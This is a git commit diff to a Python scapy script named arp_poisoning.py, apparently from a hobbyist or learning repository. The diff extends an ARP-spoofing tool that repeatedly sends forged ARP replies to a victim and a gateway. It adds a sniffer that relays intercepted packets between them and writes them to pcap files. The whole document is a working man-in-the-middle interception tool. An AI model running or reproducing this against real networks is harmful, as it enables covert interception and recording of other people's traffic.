5514a8fd5914dbb84910e0652126fd0550e6ae2b
tlatkdgus1 <ipod1597@naver.com>
2016-08-05 07:18:48 +0900

    arp_poisoning

--- arp_poisoning.py
+++ arp_poisoning.py
@@ -2,19 +2,51 @@ from scapy.all import *
 from netifaces import *
 import subprocess, shlex, re, threading
 from time import *
+
+pktdump_victim = PcapWriter("pkt_victim.pcap", append=True, sync=True)
+pktdump_gateway = PcapWriter("pkt_gateway.pcap", append=True, sync=True)
  
 def run_vPoisoning():
 	while True:
 		send(vPoisoning, verbose = False)
-		print "Send Victim Poisoning Packet!! \n"
+		#print "Send Victim Poisoning Packet!! \n"
 		sleep(1)
 
 def run_gPoisoning():
 	while True:
 		send(gPoisoning, verbose = False)
-		print("Send Gateway Poisoning Packet!! \n")
+		#print("Send Gateway Poisoning Packet!! \n")
 		sleep(1)
 
+def victim_packet(pkt):
+	pktdump_victim.write(pkt)
+	send(pkt)
+	
+def gateway_packet(pkt):
+	pktdump_gateway.write(pkt)
+	send(pkt)
+
+def relay_packet(pkt):
+	pktdump_victim.write(pkt)
+	if IP in pkt:
+		ip_src = pkt[IP].src
+		ip_dst = pkt[IP].dst
+		print "================"
+		print pkt.display()
+		print ""
+		print ip_src
+		print " "
+		print ip_dst
+		print "================"
+
+		if ((pkt[IP].src == gatewayIP) and ((pkt[IP].dst == victimIP) or (pkt[Ether].dst == "ff:ff:ff:ff:ff:ff"))):
+			victim_packet(pkt)
+		elif ((pkt[IP].src == victimIP) and ((pkt[IP].dst == gatewayIP) or (pkt[Ether].dst == "ff:ff:ff:ff:ff:ff"))):
+			gateway_packet(pkt)
+
+
+def run_sniff_packet():
+	sniff(prn = relay_packet)
 
 str_ifconfig = subprocess.check_output(shlex.split('ifconfig'))
 re_ifconfigIP = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
@@ -59,7 +91,6 @@ gPoisoning.hwsrc = victimMAC
 gPoisoning.hwdst = gatewayMAC
 
 threading.Thread(target=run_gPoisoning).start()
-
-
+threading.Thread(target=run_sniff_packet).start()
 
 
